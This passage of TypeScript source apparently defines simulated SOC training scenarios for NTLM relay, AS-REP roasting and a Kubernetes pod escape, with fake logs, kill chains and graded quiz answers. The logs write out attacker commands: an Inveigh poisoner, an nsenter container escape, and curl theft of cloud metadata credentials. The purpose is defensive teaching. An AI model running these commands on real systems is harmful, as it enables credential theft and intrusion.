    { ts: T(6 * HOUR + 1 * MIN),   phase: "Privilege Abuse",   action: "SeBackupPrivilege assigned to svc-backup session — file ACL bypass established" },
    { ts: T(6 * HOUR + 5 * MIN),   phase: "Discovery",         action: "net.exe enumerates Domain Admins group — attacker mapping escalation path" },
    { ts: T(6 * HOUR + 20 * MIN),  phase: "Credential Access", action: "ntdsutil.exe extracts NTDS.dit via IFM — 847 domain account NTLM hashes compromised" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 20,
      prompt: "Events 2, 3, and 4 all show Kerberos Event 4768. What single field makes these events malicious?",
      kind: "single",
      options: [
        { value: "a", label: "TicketEncryptionType is 0x17 (RC4-HMAC) rather than 0x12 (AES256), which is the downgrade that makes the ticket crackable" },
        { value: "b", label: "PreAuthType=0 means the account does not require pre-authentication — the attacker got the TGT without providing any credentials" },
        { value: "c", label: "All three requests share the same IpAddress value, showing one host enumerated tickets for three different accounts in sequence" },
        { value: "d", label: "The ServiceName is krbtgt, and a TGT request for the krbtgt service is the signature of a forged Golden Ticket being used" },
      ],
      answer: "b",
      explanation: "PreAuthType=0 is the smoking gun. Normal Kerberos auth requires the client to prove identity with an encrypted timestamp. Accounts with pre-auth disabled hand out AS-REP responses to anyone who asks — no credentials needed. The attacker takes the RC4-encrypted TGT and cracks it offline.",
    },
    {
      id: "q2", xp: 20,
      prompt: "There is a 6-hour gap between Events 4-6 (roasting) and Events 7-10 (lateral movement). What does this gap indicate?",
      kind: "single",
      options: [
        { value: "a", label: "The attacker was waiting out the account lockout window before retrying authentication against the domain controller" },
        { value: "b", label: "The attacker was staging additional tooling on the host, downloading PsExec and credential dumpers before moving laterally" },
        { value: "c", label: "Offline hash cracking — the gap between capturing the AS-REP hash and cracking it with a wordlist (e.g., hashcat)" },
        { value: "d", label: "The activity paused because the attacker operates on a different time zone and resumed at the start of their working hours" },
      ],
      answer: "c",
      explanation: "AS-REP Roasting produces an offline-crackable hash. The 6-hour gap is the cracking time. Hashcat on a GPU can crack weak service account passwords in minutes to hours. The sudden appearance of svc-backup authenticating from WS-DEV-09 (the attacker machine) confirms the crack succeeded.",
    },
    {
      id: "q3", xp: 15,
      prompt: "Event 8 shows svc-backup receiving SeBackupPrivilege. Why is this dangerous even without Domain Admin rights?",
      kind: "single",
      options: [
        { value: "a", label: "SeBackupPrivilege allows reading ANY file regardless of ACLs — including ntds.dit, which contains NTLM hashes for all domain accounts" },
        { value: "b", label: "SeBackupPrivilege lets the holder register scheduled tasks that run as SYSTEM, giving code execution on the DC at every boot" },
        { value: "c", label: "SeBackupPrivilege adds the account to the Remote Desktop Users group, allowing an interactive session on any domain controller" },
        { value: "d", label: "SeBackupPrivilege allows the account to stop the Windows Defender service and clear its exclusion list, blinding detection" },
      ],
      answer: "a",
      explanation: "SeBackupPrivilege bypasses all file ACLs for 'backup purposes.' Combined with ntdsutil.exe, an attacker can copy NTDS.dit (the AD database) containing NTLM hashes for every domain account — instant domain compromise via Pass-the-Hash.",
    },
    {
      id: "q4", xp: 25,
      prompt: "What is the correct immediate remediation for this attack?",
      kind: "single",
      options: [
        { value: "a", label: "Reset svc-backup's password to a 25-character random value, migrate it to a Group Managed Service Account, and monitor Event ID 4768 for further TGT requests" },
        { value: "b", label: "Network-contain WS-DEV-09 with the EDR isolation action, reimage the host from a clean image, and block the attacker's outbound IP at the perimeter firewall" },
        { value: "c", label: "Enable Kerberos pre-authentication on the three accounts by clearing the DONT_REQ_PREAUTH bit in userAccountControl, then apply a fine-grained password policy" },
        { value: "d", label: "Enable Kerberos pre-authentication for all three accounts AND assume full domain compromise — all passwords must be changed including krbtgt twice (NTDS.dit was accessed)" },
      ],
      answer: "d",
      explanation: "Since ntdsutil accessed NTDS.dit (Event 10), all domain credentials are compromised. Response must include: (1) Enable pre-auth on affected accounts. (2) Reset all domain account passwords. (3) Reset krbtgt password TWICE (golden ticket prevention). (4) Force-expire all active Kerberos tickets.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "AS-REP Roasting → Offline Hash Crack",
    threat_actor: "APT28 (Fancy Bear)",
    attack_kind: "Credential Access / Lateral Movement",
    briefing: "CrowdStrike raised a detection on WS-DEV-09 under m.johnson's account at 09:04. DC01 logged a burst of Kerberos ticket issuance for three service accounts around the same time, and Zeek flagged the traffic between the two hosts.",
    narrative: "APT28 operator with foothold on developer workstation WS-DEV-09 discovers three NexaCorp service accounts with Kerberos pre-authentication disabled. Using Impacket GetNPUsers.py, they request AS-REP responses (TGTs) without providing credentials. The RC4-encrypted TGT hashes are cracked offline (silent period — no logs). Six hours later, the cracked svc-backup password is used to authenticate laterally, access NTDS.dit via shadow copy, and probe Domain Admin group membership.",
    learning_objectives: [
      "Understand that Kerberos Event 4768 with PreAuthType=0 means the account is vulnerable to AS-REP Roasting",
      "Recognize Impacket tooling signatures in EDR logs",
      "Understand why a 6-hour gap between roasting and lateral movement indicates offline cracking",
      "Know that SeBackupPrivilege enables NTDS.dit access without Domain Admin rights",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── NTLM Relay — Internal Credential Hijacking (⭐⭐⭐ Advanced) ────────────

export function buildNtlmRelayScenario(scenarioId = "ntlm-relay-responder"): ScenarioBundle {
  const B = new Date("2026-05-14T10:12:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const events: TelemetryEvent[] = [
    {
      id: "ntlm_01_llmnr_broadcast",
      ts: T(0),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection", severity: "low", mitre_technique: "T1557.001",
      hostname: "WS-FIN-03", src_ip: "10.0.1.31", dst_ip: "224.0.0.252", dst_port: 5355,
      description: "WS-FIN-03 sent an LLMNR UDP broadcast (port 5355) to 224.0.0.252, attempting to resolve a share name that DNS could not resolve.",
      fp_explanation: "LLMNR UDP 5355 multicasts are extremely common in Windows networks — almost every misconfigured machine generates them for typo'd share names. This looks like routine name resolution noise.",
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.srcip": "10.0.1.31",
        "data.dstip": "224.0.0.252",
        "data.dstport": "5355",
        "data.proto": "17",
        "data.action": "accept",
        "data.app": "LLMNR",
        "data.sentbyte": 72,
        "data.rcvdbyte": 0,
      },
    },
    {
      id: "ntlm_02_llmnr_response",
      ts: T(2_000),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection", severity: "low", mitre_technique: "T1557.001",
      hostname: "WS-DEV-09", src_ip: "10.0.1.45", dst_ip: "10.0.1.31", dst_port: 5355,
      description: "WS-DEV-09 sent a unicast LLMNR response directly to WS-FIN-03 two seconds later, claiming to be the requested host.",
      fp_explanation: "A UDP response on 5355 from another workstation could be legitimate name resolution. This pattern only becomes suspicious when correlated with the subsequent auth failure.",
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.srcip": "10.0.1.45",
        "data.dstip": "10.0.1.31",
        "data.dstport": "5355",
        "data.proto": "17",
        "data.action": "accept",
        "data.app": "LLMNR",
        "data.sentbyte": 88,
        "data.rcvdbyte": 0,
      },
    },
    {
      // REPLACED a 4625 that could not exist. The previous version put a failed
      // NTLM logon on WS-DEV-09 with SubStatus 0xC000006A (wrong password).
      //
      // Two problems. In a relay the victim's NTLM blob is consumed by the
      // attacker's userland tooling and never handed to the local LSA, so
      // Windows writes no authentication record at all on that host. And
      // 0xC000006A asserts the credential WAS validated and found wrong —
      // three seconds before the same credential succeeds on SRV-FILE01. That
      // pushed the analyst toward cracking or spraying, which is the wrong
      // technique family entirely.
      //
      // What the victim actually leaves is an SMB session to the poisoner.
      id: "ntlm_03_victim_smb_session",
      ts: T(5_000),
      source: "firewall", vendor: "Corelight (Zeek)",
      event_type: "net_connection", severity: "medium", mitre_technique: "T1557.001",
      hostname: "WS-FIN-03", user_email: "l.nguyen@nexacorp.com", src_ip: "10.0.1.31",
      description: "WS-FIN-03 opened an SMB session to 10.0.1.45 on port 445, three seconds after receiving the LLMNR answer.",
      fp_explanation: "Workstation-to-workstation SMB is unusual but not unheard of on this network — a developer sharing a build folder produces the same shape.",
      raw: {
        "zeek.log_type": "smb_mapping",
        "zeek.uid": "CmZ8k24Xb9pQwL3vTf",
        "id.orig_h": "10.0.1.31",
        "id.orig_p": "49821",
        "id.resp_h": "10.0.1.45",
        "id.resp_p": "445",
        "smb.path": "\\\\10.0.1.45\\FINANCE-ARCHIVE",
        "smb.share_type": "DISK",
        "smb.native_file_system": "",
        "network.transport": "tcp",
      },
    },
    {
      id: "ntlm_04_responder_detected",
      ts: T(1_000),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create", severity: "critical", mitre_technique: "T1557.001",
      hostname: "WS-DEV-09", user_email: "m.johnson@nexacorp.com",
      // Was `python3.exe` running `Responder.py -I eth0` on a WINDOWS host.
      // eth0 is a Linux interface name, the Windows Python binary is
      // python.exe, and Responder needs to bind UDP 137/138/5355 and TCP
      // 445/139 — which LanmanServer already holds on Windows. Inveigh is the
      // Windows-native equivalent and does exactly this job.
      description: "Inveigh.exe started on WS-DEV-09 under m.johnson's account with LLMNR, NBNS and SMB listeners enabled.",
      raw: {
        "crowdstrike.process_name": "Inveigh.exe",
        "crowdstrike.commandline": "Inveigh.exe -LLMNR Y -NBNS Y -SMB Y -Inspect N -FileOutput Y",
        "crowdstrike.filename": "Inveigh.exe",
        "crowdstrike.filepath": "C:\\Users\\m.johnson\\AppData\\Local\\Temp\\",
        "crowdstrike.username": "NEXACORP\\m.johnson",
        "crowdstrike.parent_basefilename": "powershell.exe",
        "crowdstrike.local_address": "10.0.1.45",
        "crowdstrike.severity": 95,
        "crowdstrike.sha256": makeSha256("inveigh_exe_llmnr_poisoner"),
      },
    },
    {
      id: "ntlm_05_relay_auth_success",
      ts: T(8_000),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high", mitre_technique: "T1078",
      hostname: "SRV-FILE01", user_email: "l.nguyen@nexacorp.com", src_ip: "10.0.1.45",
      description: "l.nguyen authenticated to SRV-FILE01 with a network logon (Type 3) over NTLM. The record names WS-FIN-03 as the workstation and 10.0.1.45 as the source address.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "SRV-FILE01",
        "winlog.event_data.TargetUserName": "l.nguyen",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        // THE relay signature, and it was previously inverted.
        //
        // ntlmrelayx forwards the victim's NTLMSSP_AUTH message verbatim — it
        // cannot rewrite the workstation name without invalidating the MIC. So
        // the relayed 4624 names the VICTIM's machine (WS-FIN-03) while the
        // packet arrives from the ATTACKER's address (10.0.1.45).
        //
        // That contradiction inside a single record is the highest-fidelity
        // relay indicator there is. This event previously carried WS-DEV-09 in
        // both fields, which is what a normal logon from that host would look
        // like — teaching the exact opposite of the tell.
        "winlog.event_data.WorkstationName": "WS-FIN-03",
        "winlog.event_data.IpAddress": "10.0.1.45",
        "winlog.event_data.IpPort": "49823",
        "winlog.event_data.LmPackageName": "NTLM V2",
        "winlog.event_data.KeyLength": "128",
      },
    },
    {
      id: "ntlm_06_psexec_service",
      ts: T(15 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "service_install", severity: "critical", mitre_technique: "T1021.002",
      hostname: "SRV-FILE01", user_email: "l.nguyen@nexacorp.com",
      description: "PSEXESVC.exe was installed as a service on SRV-FILE01, launched under the relayed l.nguyen credentials.",
      raw: {
        "crowdstrike.process_name": "PSEXESVC.exe",
        "crowdstrike.parent_basefilename": "services.exe",
        "crowdstrike.filename": "PSEXESVC.exe",
        "crowdstrike.filepath": "C:\\Windows\\",
        "crowdstrike.username": "NEXACORP\\l.nguyen",
        "crowdstrike.sha256": makeSha256("PSEXESVC-ntlm-relay-2026"),
        "crowdstrike.severity": 90,
      },
    },
    {
      id: "ntlm_07_system_logon",
      ts: T(15 * MIN + 3_000),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high", mitre_technique: "T1021.002",
      hostname: "SRV-FILE01",
      description: "A LogonType 5 (Service) logon for NT AUTHORITY\\SYSTEM was recorded on SRV-FILE01, three seconds after PSEXESVC.exe was installed.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": "SRV-FILE01",
        "winlog.event_data.TargetUserName": "SYSTEM",
        "winlog.event_data.TargetDomainName": "NT AUTHORITY",
        "winlog.event_data.LogonType": "5",
        "winlog.event_data.LogonProcessName": "Advapi",
        "winlog.event_data.AuthenticationPackageName": "Negotiate",
      },
    },
    {
      id: "ntlm_08_domain_recon",
      ts: T(16 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create", severity: "high", mitre_technique: "T1087.002",
      hostname: "SRV-FILE01",
      description: "net user /domain ran on SRV-FILE01 under NT AUTHORITY\\SYSTEM, spawned from cmd.exe.",
      raw: {
        "crowdstrike.process_name": "net.exe",
        "crowdstrike.commandline": "net user /domain",
        "crowdstrike.parent_basefilename": "cmd.exe",
        "crowdstrike.parent_commandline": "cmd.exe /c net user /domain",
        "crowdstrike.username": "NT AUTHORITY\\SYSTEM",
        "crowdstrike.local_address": "10.0.2.20",
        "crowdstrike.severity": 60,
      },
    },
    {
      id: "ntlm_09_lsass_dump",
      ts: T(18 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_access", severity: "critical", mitre_technique: "T1003.001",
      hostname: "SRV-FILE01",
      description: "cmd.exe running as NT AUTHORITY\\SYSTEM on SRV-FILE01 accessed lsass.exe (PID 688) with GrantedAccess 0x1FFFFF.",
      raw: {
        "crowdstrike.target_imagefilename": "lsass.exe",
        "crowdstrike.granted_access": "0x1FFFFF",
        "crowdstrike.process_name": "cmd.exe",
        "crowdstrike.username": "NT AUTHORITY\\SYSTEM",
        "crowdstrike.target_process_id": "688",
        "crowdstrike.severity": 95,
      },
    },
    {
      id: "ntlm_10_lateral_smb",
      ts: T(25 * MIN),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection", severity: "critical", mitre_technique: "T1021.002",
      hostname: "SRV-FILE01", src_ip: "10.0.2.20", dst_port: 445,
      // Was ONE record carrying `data.dstip: "10.0.2.30,10.0.2.31,10.0.0.5"` and
      // `data.msg: "SMB lateral movement to multiple targets"`. FortiGate writes
      // one record per session — dstip is never a list — and a traffic log does
      // not editorialise. That msg field also handed over the conclusion this
      // event exists for the analyst to reach. Split into three real sessions;
      // the "three targets in one window" observation is now the student's.
      description: "SRV-FILE01 opened an outbound SMB session to 10.0.2.30 on port 445.",
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.srcip": "10.0.2.20",
        "data.dstip": "10.0.2.30",
        "data.dstport": "445",
        "data.proto": "6",
        "data.action": "accept",
        "data.app": "SMB",
        "data.sentbyte": 64_218,
        "data.rcvdbyte": 31_907,
        "data.sessionid": "48812207",
      },
    },
    {
      id: "ntlm_10b_lateral_smb",
      ts: T(25 * MIN + 40_000),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection", severity: "high", mitre_technique: "T1021.002",
      hostname: "SRV-FILE01", src_ip: "10.0.2.20", dst_port: 445,
      description: "SRV-FILE01 opened an outbound SMB session to 10.0.2.31 on port 445.",
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.srcip": "10.0.2.20",
        "data.dstip": "10.0.2.31",
        "data.dstport": "445",
        "data.proto": "6",
        "data.action": "accept",
        "data.app": "SMB",
        "data.sentbyte": 71_004,
        "data.rcvdbyte": 38_622,
        "data.sessionid": "48812341",
      },
    },
    {
      id: "ntlm_10c_lateral_smb",
      ts: T(25 * MIN + 95_000),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection", severity: "high", mitre_technique: "T1021.002",
      hostname: "SRV-FILE01", src_ip: "10.0.2.20", dst_port: 445,
      description: "SRV-FILE01 opened an outbound SMB session to 10.0.0.5 on port 445.",
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.srcip": "10.0.2.20",
        "data.dstip": "10.0.0.5",
        "data.dstport": "445",
        "data.proto": "6",
        "data.action": "accept",
        "data.app": "SMB",
        "data.sentbyte": 52_201,
        "data.rcvdbyte": 23_682,
        "data.sessionid": "48812498",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "ip",     value: "10.0.1.45",                                 reputation: "malicious", tags: ["ws-dev-09"] },
    { type: "sha256", value: makeSha256("inveigh_exe_llmnr_poisoner"), reputation: "malicious", tags: ["poisoning-tool", "workstation"] },
    { type: "sha256", value: makeSha256("PSEXESVC-ntlm-relay-2026"),     reputation: "malicious", tags: ["psexec", "lateral-movement", "remote-exec"] },
    { type: "host",   value: "WS-DEV-09",                                 reputation: "malicious", tags: ["internal-host"] },
  ];

  const killchain = [
    { ts: T(0),           phase: "Collection",        action: "WS-FIN-03 broadcasts an LLMNR query for a name DNS could not resolve — the poisoner answers it" },
    { ts: T(1_000),       phase: "Credential Access", action: "Inveigh on WS-DEV-09 answers the broadcast, redirecting WS-FIN-03 to the attacker host" },
    { ts: T(5_000),       phase: "Credential Access", action: "l.nguyen's NTLM challenge-response captured and relayed to SRV-FILE01" },
    { ts: T(8_000),       phase: "Lateral Movement",  action: "Relay succeeds — l.nguyen authenticated to SRV-FILE01 from attacker IP 10.0.1.45" },
    { ts: T(15 * MIN),    phase: "Execution",         action: "PSEXESVC.exe deployed via relayed credentials — remote SYSTEM execution on SRV-FILE01" },
    { ts: T(16 * MIN),    phase: "Discovery",         action: "net user /domain enumerates all domain accounts from SYSTEM context" },
    { ts: T(18 * MIN),    phase: "Credential Access", action: "LSASS dumped with PROCESS_ALL_ACCESS (0x1FFFFF) — server credentials harvested" },
    { ts: T(25 * MIN),    phase: "Lateral Movement",  action: "SMB connections to 3 additional internal servers using credentials from LSASS dump" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 25,
      prompt: "Which single event, on its own and without correlating it against anything else, confirms an NTLM relay is under way?",
      kind: "single",
      options: [
        { value: "a", label: "Event 1 — WS-FIN-03 broadcasting an LLMNR query for a name its DNS server could not resolve" },
        { value: "b", label: "Event 3 — WS-FIN-03 opening an SMB session to another workstation rather than to a file server" },
        { value: "c", label: "Event 4 — an LLMNR/NBNS poisoning tool running on WS-DEV-09 with its listener flags in the command line" },
        { value: "d", label: "Event 5 — l.nguyen successfully authenticating to SRV-FILE01 over NTLM with a network logon" },
      ],
      answer: "c",
      explanation: "Event 4 is the only unambiguous one. An LLMNR broadcast is ordinary Windows behaviour whenever DNS misses, and workstation-to-workstation SMB is unusual without being proof of anything. Event 5 is genuinely damning once you read WorkstationName against IpAddress — but that takes a comparison, whereas a process whose command line enables LLMNR, NBNS and SMB listeners has no legitimate purpose on a corporate endpoint and needs no correlation to interpret. It is also the earliest point at which containment would still have prevented the relay.",
    },
    {
      id: "q2", xp: 20,
      prompt: "Event 5 is a successful 4624 for l.nguyen on SRV-FILE01. Reading only that one record, what marks it as a relayed authentication?",
      kind: "single",
      options: [
        { value: "a", label: "l.nguyen holds no group membership in the SRV-FILE01 share ACL, so a successful logon for that account cannot be genuine" },
        { value: "b", label: "WorkstationName says WS-FIN-03 but the connection arrived from 10.0.1.45 — the machine naming itself is not the machine that connected" },
        { value: "c", label: "The logon negotiated NTLM rather than Kerberos, and NTLM against a domain-joined file server is by itself sufficient proof of relay" },
        { value: "d", label: "The LogonType is 3 (network) rather than 2 (interactive), which should never appear on a file server holding departmental shares" },
      ],
      answer: "b",
      explanation: "One record contradicts itself, and that is the whole finding. The relaying tool forwards the victim's NTLMSSP_AUTH message byte for byte — it cannot rewrite the workstation name inside it without invalidating the message integrity code and breaking the authentication it is trying to complete. So the name travels with the stolen blob (WS-FIN-03, the victim) while the packet is emitted by the attacker's host (10.0.1.45). Those two fields describing different machines in a single 4624 is the highest-fidelity relay indicator there is, and it needs no asset inventory to spot — the record impeaches itself. Option (c) is the common overreach: NTLM to a file server is extremely ordinary, and treating it as proof would bury a SOC in false positives. Option (d) is simply what a file share looks like — LogonType 3 is the normal case there. Option (a) inverts how authentication and authorisation relate: the 4624 records that the credential was accepted, and share permissions are evaluated afterwards.",
    },
    {
      id: "q3", xp: 15,
      prompt: "What is the root cause that allowed this NTLM relay attack to succeed?",
      kind: "single",
      options: [
        { value: "a", label: "l.nguyen was over-privileged — a standard user should not hold write access to SRV-FILE01" },
        { value: "b", label: "LLMNR was enabled on the network AND SMB signing was not enforced on SRV-FILE01" },
        { value: "c", label: "The attacker had physical access to WS-DEV-09 and plugged a rogue device into the switch" },
        { value: "d", label: "Windows Defender real-time protection was disabled on WS-FIN-03, so the tool ran unblocked" },
      ],
      answer: "b",
      explanation: "Two conditions had to hold at once. LLMNR/NBT-NS being enabled is what let the attacker answer a name lookup they had no right to answer — that is the poisoning step. SMB signing not being required on SRV-FILE01 is what let the stolen authentication be accepted from a machine that did not originate it. Signing does not DETECT a relay; it PREVENTS one, and the mechanism matters: signing binds the session to a key derived during authentication, and the relaying attacker never possesses that key because they only forward the victim's messages without ever learning the secret behind them. The same fact explains something worth putting in the report: changing l.nguyen's password does not help here, because the attacker never learned her password or her hash — they borrowed a live authentication and spent it. Remediation is disabling LLMNR and NBT-NS by GPO and requiring SMB signing on servers, and neither is a detection control.",
    },
    {
      id: "q4", xp: 20,
      prompt: "Which detection approach would have caught the poisoning tool in Event 4 before the relay succeeded?",
      kind: "single",
      options: [
        { value: "a", label: "Monitoring all UDP port 5355 LLMNR broadcast traffic on the workstation VLAN and alerting on any spike in name-resolution volume" },
        { value: "b", label: "EDR process detection — the binary is known, and a command line enabling LLMNR, NBNS and SMB listeners has no legitimate use on an endpoint" },
        { value: "c", label: "Configuring a firewall rule that denies inbound TCP 445 to SRV-FILE01 from every workstation subnet so SMB relay cannot reach it" },
        { value: "d", label: "Alerting on every NTLM authentication failure recorded as Event ID 4625 on member servers and treating each one as a possible relay attempt" },
      ],
      answer: "b",
      explanation: "EDR catches the tool before a single credential is captured, which is the only point at which this is still preventable rather than merely detectable. Monitoring LLMNR broadcast volume fails because broadcasts are constant baseline noise on any Windows network and the poisoner adds almost none of it — the attacker ANSWERS traffic rather than generating it. Denying inbound 445 from workstation subnets is a prevention control rather than a detection, and it would break ordinary file sharing while doing nothing about a relay that stays inside one VLAN. Alerting on every 4625 buries the SOC in noise and, in this scenario, would have found nothing at all: a relay produces no failed logon on the poisoning host.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "NTLM Relay — Internal Credential Hijacking",
    threat_actor: "FIN7 (compromised internal machine)",
    attack_kind: "Credential Access / Lateral Movement",
    briefing: "Zeek flagged LLMNR broadcast traffic on the finance VLAN at 10:12 and CrowdStrike raised a tooling detection on WS-DEV-09. Separately, SRV-FILE01 recorded a service installation and a network logon for l.nguyen. All three are on one ticket.",
    narrative: "An operator with a foothold on developer workstation WS-DEV-09 runs Inveigh to answer LLMNR broadcasts. When finance analyst l.nguyen's machine (WS-FIN-03) looks up a share name DNS cannot resolve, the poisoner answers and presents itself as the target. WS-FIN-03 sends its NTLM authentication — which is relayed onward to SRV-FILE01, arriving from the attacker's address while still carrying the victim's workstation name inside it. The attacker then deploys PSEXESVC for SYSTEM execution, dumps LSASS credentials, and pivots to three additional internal servers. No external C2, no malware dropped on WS-FIN-03 — just internal auth relay.",
    learning_objectives: [
      "Correlate three low-fidelity events (LLMNR broadcast, LLMNR response, auth failure) into a single attack chain",
      "Identify that relay auth source IP differs from the victim's actual workstation IP",
      "Understand that LLMNR disable + SMB signing are the dual prerequisites for relay prevention",
      "Recognise an LLMNR/NBNS poisoning tool from its listener flags in EDR command lines",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── Kubernetes Pod Escape → Cloud Metadata Theft (⭐⭐⭐ Advanced) ──────────

export function buildK8sPodEscapeScenario(scenarioId = "k8s-pod-escape-imds"): ScenarioBundle {
  const B = new Date("2026-05-20T02:45:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const events: TelemetryEvent[] = [
    {
      id: "k8s_01_kubectl_exec",
      ts: T(0),
      source: "k8s_audit", vendor: "Kubernetes Audit",
      // T1609 Container Administration Command — running a command in an
      // EXISTING container. T1610 is Deploy Container (creating a new one),
      // which is correct for k8s_09_privileged_pod but wrong here.
      event_type: "k8s_exec", severity: "medium", mitre_technique: "T1609",
      hostname: "api-prod-7f8b9c", src_ip: "185.220.101.47", dst_port: 443,
      description: "The ci-deploy-token service account ran kubectl exec into container api-prod-7f8b9c from 185.220.101.47, a known Tor exit node.",
      fp_explanation: "kubectl exec is routine in dev and SRE workflows — engineers exec into containers to debug them many times a day, and ci-deploy is a legitimate service account that is expected to touch production workloads.",
      raw: {
        "kubernetes.audit.verb": "create",
        "kubernetes.audit.objectRef.resource": "pods/exec",
        "kubernetes.audit.objectRef.name": "api-prod-7f8b9c",
        "kubernetes.audit.objectRef.namespace": "production",
        "kubernetes.audit.user.username": "ci-deploy-token",
        "kubernetes.audit.user.groups[0]": "system:serviceaccounts",
        "kubernetes.audit.sourceIPs[0]": "185.220.101.47",
        "kubernetes.audit.responseStatus.code": 101,
        "kubernetes.audit.requestURI": "/api/v1/namespaces/production/pods/api-prod-7f8b9c/exec?command=sh&stdin=true&stdout=true&tty=true",
        "kubernetes.audit.userAgent": "kubectl/v1.28.2 (linux/amd64) kubernetes/9124985",
      },
    },
    // ── The misconfiguration that MAKES the escape possible ─────────────────
    //
    // ADDED. Without this the scenario taught the single most common
    // misconception in container security: that `nsenter --mount=/proc/1/ns/mnt`
    // escapes an ordinary hardened container.
    //
    // It does not. Reaching the HOST's namespaces through /proc/1 requires the
    // pod to run with hostPID (otherwise /proc/1 is the container's own PID 1
    // and the command escapes nothing), and setns() requires CAP_SYS_ADMIN,
    // which in practice means privileged. Neither was established anywhere for
    // api-prod-7f8b9c — the only privileged pod in the scenario was a DIFFERENT
    // pod created ten minutes later.
    //
    // Surfacing the pod spec turns the story from "the attacker ran a magic
    // command" into "the escape was available because this production pod had
    // been running privileged for months", which is the finding that belongs in
    // the report and the thing that actually gets fixed afterwards.
    {
      id: "k8s_01b_pod_spec_review",
      ts: T(1 * MIN),
      source: "k8s_audit", vendor: "Kubernetes Audit",
      event_type: "k8s_rbac", severity: "medium",
      hostname: "api-prod-7f8b9c", src_ip: "185.220.101.47",
      description: "The pod spec for api-prod-7f8b9c was read. The container runs with privileged true, hostPID true, and CAP_SYS_ADMIN.",
      fp_explanation: "Reading a pod spec is ordinary operational activity, and this deployment has run with these settings since it was created — the workload needs host-level metrics collection.",
      raw: {
        "kubernetes.audit.verb": "get",
        "kubernetes.audit.objectRef.resource": "pods",
        "kubernetes.audit.objectRef.name": "api-prod-7f8b9c",
        "kubernetes.audit.objectRef.namespace": "production",
        "kubernetes.audit.user.username": "system:serviceaccount:cicd:ci-deploy",
        "kubernetes.audit.sourceIPs[0]": "185.220.101.47",
        "kubernetes.audit.responseStatus.code": 200,
        "kubernetes.audit.responseObject.spec.hostPID": true,
        "kubernetes.audit.responseObject.spec.containers[0].securityContext.privileged": true,
        "kubernetes.audit.responseObject.spec.containers[0].securityContext.capabilities.add[0]": "SYS_ADMIN",
        "kubernetes.audit.responseObject.metadata.creationTimestamp": "2025-11-04T08:12:44Z",
      },
    },
    {
      id: "k8s_02_nsenter_escape",
      ts: T(2 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create", severity: "critical", mitre_technique: "T1611",
      hostname: "eks-node-i-0abc123",
      description: "CrowdStrike detected nsenter running inside container a3f7b1c9d2e8 with all four host namespace flags (mount, uts, ipc, net), spawning bash as root.",
      raw: {
        "crowdstrike.process_name": "nsenter",
        "crowdstrike.commandline": "nsenter --mount=/proc/1/ns/mnt --uts=/proc/1/ns/uts --ipc=/proc/1/ns/ipc --net=/proc/1/ns/net -- bash",
        "crowdstrike.username": "root",
        "crowdstrike.container_id": "a3f7b1c9d2e8",
        "crowdstrike.container_runtime": "containerd",
        "crowdstrike.parent_basefilename": "sh",
        "crowdstrike.severity": 95,
      },
    },
    {
      id: "k8s_03_imds_query",
      ts: T(3 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "net_connection", severity: "critical", mitre_technique: "T1552.005",
      hostname: "eks-node-i-0abc123",
      description: "root ran curl against 169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role from the EKS node.",
      raw: {
        "crowdstrike.process_name": "curl",
        "crowdstrike.commandline": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role",
        "crowdstrike.username": "root",
        "crowdstrike.remote_address": "169.254.169.254",
        "crowdstrike.remote_port": "80",
        "crowdstrike.container_id": "a3f7b1c9d2e8",
        "crowdstrike.severity": 90,
      },
    },
    {
      id: "k8s_04_creds_written",
      ts: T(3 * MIN + 15_000),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "file_create", severity: "high", mitre_technique: "T1552.005",
      hostname: "eks-node-i-0abc123",
      description: "The IMDS response was redirected to /tmp/.cache/.env on the EKS node.",
      raw: {
        "crowdstrike.process_name": "bash",
        "crowdstrike.commandline": "bash -c \"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role > /tmp/.cache/.env\"",
        "crowdstrike.target_filename": "/tmp/.cache/.env",
        "crowdstrike.username": "root",
        "crowdstrike.severity": 75,
      },
    },
    {
      id: "k8s_05_sts_verify",
      ts: T(5 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
